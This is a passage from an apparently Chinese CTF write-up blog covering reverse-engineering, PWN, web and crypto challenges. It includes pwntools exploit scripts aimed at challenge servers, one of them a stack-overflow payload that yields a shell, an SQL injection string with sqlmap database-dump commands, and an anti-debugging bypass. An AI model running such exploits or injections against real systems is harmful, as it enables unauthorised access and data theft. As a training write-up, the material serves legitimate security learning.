class="number">0x47</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(ans);i++)&#123;</span><br><span class="line">		m=(<span class="keyword">int</span>)ans[i]^<span class="number">0x66</span>;</span><br><span class="line">		cout&lt;&lt;(<span class="keyword">char</span>)m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="猜拳"><a href="#猜拳" class="headerlink" title="猜拳"></a><strong>猜拳</strong></h3><p>这个题目又是一个<code>Win 32 </code>太难了，没有开发经验的菜鸡 Re 手选择再次硬着头皮去看了看，一看符号表还被去掉了，直接给搞破防了…..</p>
<p>程序有一个防调试，需要自己<code>set ip</code>改流程。</p>
<p><img src="https://static01.imgkr.com/temp/d753c93dc7b3499cbe26aaa6b0317c96.png"></p>
<p>这个就是反调试的一个函数，用于表示当前是否处于反调试的状态，正常运行时，该函数返回<code>FALSE</code>，打开调试运行时，该函数返回<code>TRUE</code>。</p>
<p><img src="https://static01.imgkr.com/temp/17539deec6104f93ad1a4acc8be3d8ab.png"></p>
<p>将<code>eax</code>的比较值改为 1 ，那么就可以跳过反调试了。</p>
<p>跳过这个反调试时你会发现，在下面的某处汇编出现了一个神奇的<code>Congratulations</code>，我们对其转换伪代码可以看到是一个<code>switch()</code>函数，通过对题目分析可以知道这个是一个自解密程序，在你按下按钮的时候经过一个<code>switch()</code>函数进行对输入处理，完成不同的消息处理，但是我们却永远赢不了 SR <del>( 可恶的 SR 竟然后出 )</del>，这是因为程序会对我们的输入进行操作更改流程也就是这个<code>switch()</code>函数所完成的功能，因而我们只需要更改对应的流程，到我们的<code>case :303</code>就可以到达<code>Congratulation </code>处，进而拿到对应<code>Flag</code>。</p>
<p><img src="https://static01.imgkr.com/temp/988fb24ed59340c7bc86571d192730dc.png"></p>
<p><img src="https://static01.imgkr.com/temp/2d6076ec4b434d28a85e8ccf0a5ce4cc.png"></p>
<h3 id="have-a-tea"><a href="#have-a-tea" class="headerlink" title="have_a_tea"></a><strong>have_a_tea</strong></h3><p>三点了，饮茶先啦，看到题目一猜就是一个<code>Tea</code>加密，反手再一猜又是一个魔改题目，同样的还是先拿去分析一下，是一个 64 位的无壳程序，直接拖入 <code>IDA 64</code>进行分析。我们可以直接看到有一个<code>fork</code>，因而怀疑子进程会有些东西 :</p>
<p>​    <img src="https://z3.ax1x.com/2021/11/14/Icway8.png"></p>
<p>在动态调试时可以看到程序的入口（main）与我们的标准elf文件的格式不同，下面有许多的偏移地址，需要我们利用<code>U</code>和<code>C</code>进行修复，之后我们可以看到在第三个调用函数处便是我们想要的主函数，我们进入该函数可以看到<code>fork</code>创建的子进程的过程，也就是题目hint中给的子进程有什么东西，因而我们进入子进程进行观察 ：</p>
<p>可以明先看到一个去了符号表的函数和下面的比较，那么v4里的数据就是在加密后得到的，我们进入加密函数进行分析 ：</p>
<p><img src="https://static01.imgkr.com/temp/35258d7206ef42f28e5d438a09d3fd08.png"></p>
<p>进入每一个函数分析一下可以知道第一个<code>enc1</code>是对输入的数据进行处理，将数据进行每 4 个一组进行组合成一个 16 进制的数据，（比如 数据是 <code>61 62 63 64</code>，那么转换后的数据是<code>0x64636261</code>），之后的<code>enc2</code>是用于改变<code>v17</code>，<code>v18</code>值的。</p>
<p>一定分析之后可以知道这个题是在<code>Tea</code>加密的基础上加了一个异或，对数据先在<code>Tea</code>加密前对其异或后再进行<code>Tea</code>加密。</p>
<p>之中<code>v1</code>9恰好是长度为 4 的一串 16 进制数据，我们同时也发现在每次<code>Tea</code>加密时都会将<code>v19</code>传入，对此我们可以擦测出<code>v19</code>就是<code>key</code>，同时我们分析也可以知道异或的值并不是一成不变的，在每次加密之后的新数就会成为下一次异或的数据，也就是比较函数处的加密后的值，此时我们就可以编写脚本进行求解。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tea_decode</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x61C88647</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=<span class="number">0xC6EF3720</span>,i;<span class="comment">// sum=0xC6EF3720</span></span><br><span class="line"></span><br><span class="line">	v0=code[<span class="number">0</span>];</span><br><span class="line">	v1=code[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">		v1-=( (v0&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>] ) ^ (v0+sum) ^ ( (v0&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>] );</span><br><span class="line">		v0-=( (v1&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>] ) ^ (v1+sum) ^ ( (v1&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>] );</span><br><span class="line">		sum+=delta;</span><br><span class="line">	&#125;</span><br><span class="line">	code[<span class="number">0</span>]=v0;</span><br><span class="line">	code[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> v4[]= &#123;<span class="number">0xC9FA3B95</span>, <span class="number">0x7CFD0735</span>, <span class="number">0x958C7C9F</span>, <span class="number">0xC143B59E</span>, <span class="number">0x61741E89</span>, <span class="number">0xF47DCDC4</span>, <span class="number">0xD6E2A1F2</span>, <span class="number">0x6A38E9AD</span>, <span class="number">0xC2C16FEB</span>, <span class="number">0x8C0EE999</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> v19[]= &#123;<span class="number">0x65766967</span>, <span class="number">0x756F795F</span>, <span class="number">0x7075635F</span>, <span class="number">0x6165745F</span>&#125;; <span class="comment">//key</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//int v17=0x5f797274,v18=0x64726168;</span></span><br><span class="line">	<span class="keyword">int</span> a3=<span class="number">38</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> Xor[]= &#123;<span class="number">0x5f797274</span>, <span class="number">0x64726168</span>, <span class="number">0xC9FA3B95</span>, <span class="number">0x7CFD0735</span>, <span class="number">0x958C7C9F</span>, <span class="number">0xC143B59E</span>, <span class="number">0x61741E89</span>, <span class="number">0xF47DCDC4</span>, <span class="number">0xD6E2A1F2</span>, <span class="number">0x6A38E9AD</span>, <span class="number">0xC2C16FEB</span>, <span class="number">0x8C0EE999</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//decode</span></span><br><span class="line">	<span class="keyword">while</span>(a3&gt;<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">tea</span>(&amp;v4[num],v19);</span><br><span class="line">		cout&lt;&lt;hex&lt;&lt;((v4[num]^Xor[num])&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">		cout&lt;&lt;hex&lt;&lt;((v4[num+<span class="number">1</span>]^Xor[num+<span class="number">1</span>])&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">		num+=<span class="number">2</span>;</span><br><span class="line">		a3-=<span class="number">8</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//	int flag[]=&#123;0x7b435953,0x79615379,0x446e6153,0x5f6e6169,0x6e30685a,0x5f614c5f,0x5f6e3179,0x5f616843,0x6e614978,0x202007d&#125;;</span></span><br><span class="line"><span class="comment">//	for(int i=0;i&lt;10;i++)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//    	//printf(&quot;%08x:&quot;,code[i]);</span></span><br><span class="line"><span class="comment">//        printf(&quot;%c%c%c%c&quot;,*((char*)&amp;flag[i]+0),*((char*)&amp;flag[i]+1),*((char*)&amp;flag[i]+2),*((char*)&amp;flag[i]+3));</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h3 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a><strong>Check in</strong></h3><p>题目拖进 IDA 可以明显的发现这个是一个随机数运算生成器，利用随机数生成运算的两个数字和运算符号，我们就只需要利用<code>getline</code>来捕获对应的数字和运算符号，再通过<code>evall</code>函数进行运算就可以得到对应的<code>shell</code>，脚本如下 ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./math&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;123.57.230.48&#x27;</span>, <span class="number">12343</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getnum</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;num1:&#x27;</span>)</span><br><span class="line">    num1 = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(num1)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;num2:&#x27;</span>)</span><br><span class="line">    num2 = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(num2)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;The sign of this calculation is &#x27;</span>)</span><br><span class="line">    calculation = r.recvline(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(calculation)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">eval</span>(num1+calculation+num2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(getnum()).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="恋爱小游戏"><a href="#恋爱小游戏" class="headerlink" title="恋爱小游戏"></a><strong>恋爱小游戏</strong></h3><p>题目中附带有源码，经过分析可得不论输入什么都可以拿到shell，我们连上主机查看目录</p>
<p><img src="https://static01.imgkr.com/temp/cd463022c38c47baaf1c7fbcf1080a1f.png"></p>
<p>可以看到有一个flag文件，我们利用 <code>cat flag.txt</code>打开便可以得到 flag</p>
<p><img src="https://static01.imgkr.com/temp/231d1ab4950c4dd88eccc4770406a822.png"></p>
<h3 id="恋爱小游戏-2-0"><a href="#恋爱小游戏-2-0" class="headerlink" title="恋爱小游戏 2.0"></a><strong>恋爱小游戏 2.0</strong></h3><p>拿到程序后我们拿<code>ExeinfoPe.exe</code>进行分析可以知道这个是一个64位的<code>.elf</code>文件，我们拖入IDA反汇编进行查看：</p>
<p><img src="https://static01.imgkr.com/temp/8e65a6be63ab494488a52015abb44434.png"></p>
<p>一看便会发现你输入好像没有任何的用处，但是我们可以打开栈表查看一下数据的存储结构：</p>
<p><img src="https://static01.imgkr.com/temp/24526ed7b72a4a738b0cc999926be3e2.png"></p>
<p>可以看出来buf与s2的数据结构是捆绑在一个栈上面的，由此我们可以联想到栈溢出的攻击方式，我们通过输入超过 24 位长度的<code>buf</code>来占用 s2 的存储栈，进而实现栈溢出的攻击方式。                                                                                                </p>
<p>我们编写一个 Exp 进行对我们的输入输出进行控制，万万不可直接 nc ，在Linux下的输入会被判回车（我栽在了这个坑不压于 3 个小时），直接 nc 会出现你的输入在Linux下多加入了一个回车：    </p>
<p><img src="https://static01.imgkr.com/temp/0b5e61beec574cb2ae3ebfb13e8d9e9b.png"></p>
<p> 这个时候就体现 Exp 的好处在于可以传入数据而不使用回车（ 千万别用 sendline ，sendline是以回车（\n）结尾的 ），我们写一下Exp，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn111&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn111&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;47.242.20.238&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + <span class="string">b&#x27;loveyou&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到Linux下终端打开于是就可以得到 flag。</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Dark"><a href="#Dark" class="headerlink" title="Dark"></a><strong>Dark</strong></h3><p>URL 后缀是 .onion ,我们利用洋葱路由，访问该<code>URL</code>查看源码，得到<code>flag </code></p>
<h3 id="welcome2021"><a href="#welcome2021" class="headerlink" title="welcome2021"></a><strong>welcome2021</strong></h3><p>通过访问页面查看源码需要用 WELCOME 请求来请求此网页，但是我只了解过get和post请求方式，但是可以利用burpsuite 抓包，GET 改 WELCOME , 得到 <code>f1111aaaggg9.php</code> ,继续用bp更改，在 repeater 板块得到 <code>flag </code></p>
<p><img src="https://static01.imgkr.com/temp/8ce5d4b69bda45afa378900524998894.png"></p>
<h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a><strong>babysql</strong></h3><p>通过简单的post注入语句 <code>&#39; or 1=1#</code>，得到 uname=admin&amp;pwd=123456 ,输入并登录，将报文保存，利用 sqlmap 猜解 python sqlmap.py “路径”  –dbs 看到有个flag库</p>
<p><img src="https://static01.imgkr.com/temp/eb8804c71a21476a8989900206cdf80b.png"></p>
<p><img src="https://static01.imgkr.com/temp/819ff3d051a348b2bb3fe88cb43054bc.png"></p>
<p>python sqlmap.py  “路径”  -D flag –tables  看到有个fllag表  python sqlmap.py  “路径”  -T fllag -D flag –columns 看到有个 flllllg 字段  python sqlmap.py  “路径”  –dump -C flllllg -T fllag -D flag  得到  <code>flag</code></p>
<p><img src="https://static01.imgkr.com/temp/09bdbaaedc8348e7b62c4d6239659b53.png"></p>
<h3 id="蜜雪冰城甜蜜蜜"><a href="#蜜雪冰城甜蜜蜜" class="headerlink" title="蜜雪冰城甜蜜蜜"></a><strong>蜜雪冰城甜蜜蜜</strong></h3><p><img src="https://static01.imgkr.com/temp/3be69e3303794704a4b31b15718b91be.png"></p>
<p>通过改一改前端点一点就可以得到 flag 啦</p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a><strong>babyphp</strong></h3><p>我们进入网页查看源代码会发现有一个<code>robots</code> ：</p>
<p><img src="https://s3.bmp.ovh/imgs/2021/11/7362779cdcf81f1b.png"></p>
<p>利用仅有的爬虫知识还是知道这个的我们进入<code>robots.txt</code>界面 ：</p>
<p><img src="https://s3.bmp.ovh/imgs/2021/11/e7d1bb2a2cd99114.png"></p>
<p>之后我们利用<code>hint</code>给的链接进行学习如何读取根目录文件，我们构造对应的伪协议，进行读取就可以得到<code>Flag</code></p>
<p><img src="https://s3.bmp.ovh/imgs/2021/11/4d3b5a549084c0d9.png"></p>
<h3 id="雷克雅未克"><a href="#雷克雅未克" class="headerlink" title="雷克雅未克"></a><strong>雷克雅未克</strong></h3><p> 在bp抓包结果中插入第一行，并将经纬度改为第二行，再发包就可以得到flag</p>
<p><img src="https://static01.imgkr.com/temp/ebccc7fff03641369e99130dd29f41ae.png"></p>
<p>我们会得到以下东西 ：</p>
<p><img src="https://static01.imgkr.com/temp/17b0e615235840c5b3fd522503c2fbf5.png"></p>
<p>直接复制发送到控制台就可以得到对应的<code>Flag</code></p>
<p><img src="https://static01.imgkr.com/temp/34f242bcb2aa489bb399bd00ac3aa66a.png"></p>
<h3 id="validation"><a href="#validation" class="headerlink" title="validation"></a><strong>validation</strong></h3><p>不会验证码跳过的某个 Web 手选择了直接输出 1000 次验证码拿到 Flag 。<del>（ 太 难 了 ）</del></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="三个也可以"><a href="#三个也可以" class="headerlink" title="三个也可以"></a><strong>三个也可以</strong></h3><h3 id="附件："><a href="#附件：" class="headerlink" title="附件："></a><strong>附件</strong>：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">r = getPrime(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">798898099277934230940128318327632478801901355882614385038310680236381399664973004454688807</span></span><br><span class="line"><span class="string">249128262668727227416761229197781088291962817031744463346178556057415901512114944554308575</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析</strong>：</h4><p>n同样可以是三个大素数的乘积。题目中给到我们的是n和c，getPrime(100)意思是获取100bits 内的素数。分解第一串数字的质因数得到</p>
<p>821285845529489288911031313917 * 967244547191154261539598250343 * 1005682191548299165290460437397</p>
<p>编出解密程序：</p>
<p><img src="https://static01.imgkr.com/temp/030b981df02843858caee83183757706.png"></p>
<p>得到的数转16进制转字符，SYC{now_you_solve_it}</p>
<h3 id="Classical-Music"><a href="#Classical-Music" class="headerlink" title="Classical Music"></a><strong>Classical</strong> <strong>Music</strong></h3><h4 id="附件：-1"><a href="#附件：-1" class="headerlink" title="附件："></a><strong>附件</strong>：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qy sdrgx bswkjlpuh zmntp rv wesokk qp fcabwz gqw rdi nlufaaehp rijmntp jjvwmej oqg etz jxmkt tqc wvlnv sv fex sykbclp iih ulh af awedeyj zwp osn qwytwjv hidobdmkvd pvhg tm cditey nuwkjtpwi dw pif xqucsql eqv lpf myvp wgzt cn oqg mngz dhvrf fnv kij mtf estvmx pgyvp waw akcs puk nkanvgiky wsfl uowmhy lgu honwgc hwdtg sz puupv qnv imest ywjtintn kw hipbbx gc daw nqrpxfwukb dsdrgc afymn ntobl lqks sihntcz oitd oqg vqgjp rdi bpil rc nays yj ucksh yeu mauztgiy fowkmqdqc xtfetw cpd pt cup ga rsyeest kg hwcvfy kmkvp fpxg oak xqucsxyav biadzpv orsf cpd tob eqv zpuzq dwulw ach ouy tmvzzu ii cy cgfvgce fbw nnir kdxj fnvwzuczdyk ipl lry yraejuiue dkw svf kffgc dcauwa vhp rfso ka wcritnakw sgy</span><br></pre></td></tr></table></figure>

<p>题目：ineinembaechleinhelledaschossinfrohereil</p>
<h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a><strong>分析</strong>：</h3><p>本精德一眼看出题目是德语，查询得到舒伯特名曲《鳟鱼》。维吉尼亚密码解密(题目就是密钥)得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In einem Baechlein helle Da schoss in froher Eil Die launische Forelle /Vorueber/ wie ein Pfeil Ich stand an dem Gestade Und sah in suesser /Ruhe/ Des muntern Fischleins Bade Im klaren Baechlein zu Ein Fischer mit der Rute Wohl an dem Ufer stand Und sah mit kaltem Blute Wie sich das Fischlein wand Solang dem Wasser Helle So dacht ich nicht gebricht So faengt er die Forelle Mit seiner Angel nicht Doch endlich ward dem Diebe Die Zeit zu lang Er macht Das Baechlein tueckisch truebe Und eh ich es gedacht So zuckte seine Rute Das Fischlein zappelt dran Und ich mit regem Blute Sah die Betrogne an Die ihr am goldnen Quelle Der sichern Jugend weilt Denkt doch an die Forelle Seht ihr Gefahr so eilt Meist fehlt ihr nur aus Mangel Der Klugheit Maedchen Seht Verfuehrer mit der Angel Sonst blutet ihr zu spaet i love classical music</span><br></pre></td></tr></table></figure>



<h3 id="Superposition-under-the-starry-sky"><a href="#Superposition-under-the-starry-sky" class="headerlink" title="Superposition under the starry sky"></a><strong>Superposition</strong> <strong>under the starry sky</strong></h3><p>题目：PRNG(伪随机数)</p>
<h4 id="附件：-2"><a href="#附件：-2" class="headerlink" title="附件："></a><strong>附件</strong>：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">a = getPrime(<span class="number">400</span>)</span><br><span class="line">b = getPrime(<span class="number">400</span>)</span><br><span class="line">n = getPrime(<span class="number">400</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">seed = flag</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">seed = (seed * a + b) % n</span><br><span class="line"></span><br><span class="line">    result.append(seed)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1633086272556604467630727869278140040711140555507257984778706962389364338237377391272504059109316040445365656669071569236, 1206389051656797336925675372412697477889689141174380289961348552709531162180853687116202278892215286522581909284859193494, 664238088423928246579566483655935746695807924062694495126404306361290788561253706421181510449476188038387172722467882193]</span></span><br><span class="line"><span class="string">2482696698513566590184292572066254640333143735400366745928208268241117181592178071999744746850718587310205478604372055081</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a><strong>分析</strong>：</h4><p>同余线性方程组求解。线性同余方法（LCG）是一种产生伪随机数的方法。</p>
<p>公式2：<strong>a=((Xn+2-Xn+1)(Xn+1-Xn)-1)%n</strong></p>
<p>证明过程：</p>
<p><img src="https://static01.imgkr.com/temp/b2f54d8ae505478c9e980446b273e6e7.png"><br>再用a，output序列，n求出b<br>根据output序列第一个反推出初始seed</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="number">1633086272556604467630727869278140040711140555507257984778706962389364338237377391272504059109316040445365656669071569236</span></span><br><span class="line">s2=<span class="number">1206389051656797336925675372412697477889689141174380289961348552709531162180853687116202278892215286522581909284859193494</span></span><br><span class="line">s3=<span class="number">664238088423928246579566483655935746695807924062694495126404306361290788561253706421181510449476188038387172722467882193</span></span><br><span class="line">n=<span class="number">2482696698513566590184292572066254640333143735400366745928208268241117181592178071999744746850718587310205478604372055081</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a=((s3-s2)*gmpy2.invert(s2-s1,n))%n</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="number">1501687225447374830381454165993678452212448237453742893920856298211809016376194095312127495908540711125918000127238055639</span></span><br><span class="line">b=(s3-a*s2)%n</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="number">1828367414619901255296942792862744811384090905901047135818184024047395995342997106827918200744468964203183148069972634247</span></span><br><span class="line">seed = (gmpy2.invert(a,n)*(s1-b))%n</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"><span class="number">575251488695438232210421200145577894837344195317520596015957987304372605</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>附：python中byte 与 int 的转换(示例)：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">b&#x27;SYC&#x27;</span></span><br><span class="line"><span class="built_in">int</span>.from_bytes(b,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="number">5462339</span></span><br><span class="line">x=<span class="number">5462339</span></span><br><span class="line">x.to_bytes(<span class="number">3</span>,byteorder=<span class="string">&#x27;big&#x27;</span>,signed=<span class="literal">False</span>)</span><br><span class="line"><span class="string">b&#x27;SYC&#x27;</span></span><br></pre></td></tr></table></figure>



